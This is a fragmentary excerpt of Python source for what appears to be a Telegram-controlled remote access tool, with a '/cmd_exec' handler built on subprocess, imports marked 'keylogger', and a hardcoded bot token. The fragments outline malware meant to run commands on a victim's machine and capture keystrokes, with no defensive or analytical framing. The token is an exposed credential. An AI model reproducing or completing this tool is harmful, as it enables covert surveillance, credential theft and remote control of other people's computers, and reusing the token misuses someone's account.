...
from subprocess import Popen, PIPE,STDOUT                                       # /cmd_exec
...
import pynput, pythoncom                                                  # keylogger
...
token = '1201835835:AAEI_EpECI-3fMVEDjfP1PxGR4URIQvNP_o'
...
##                                                response = '/cmd_exec dir'
                                ...
                                cd.log('e','Details from previous error'+str(e))
                                #raise
...
#hookManager = pynput.HookManager()
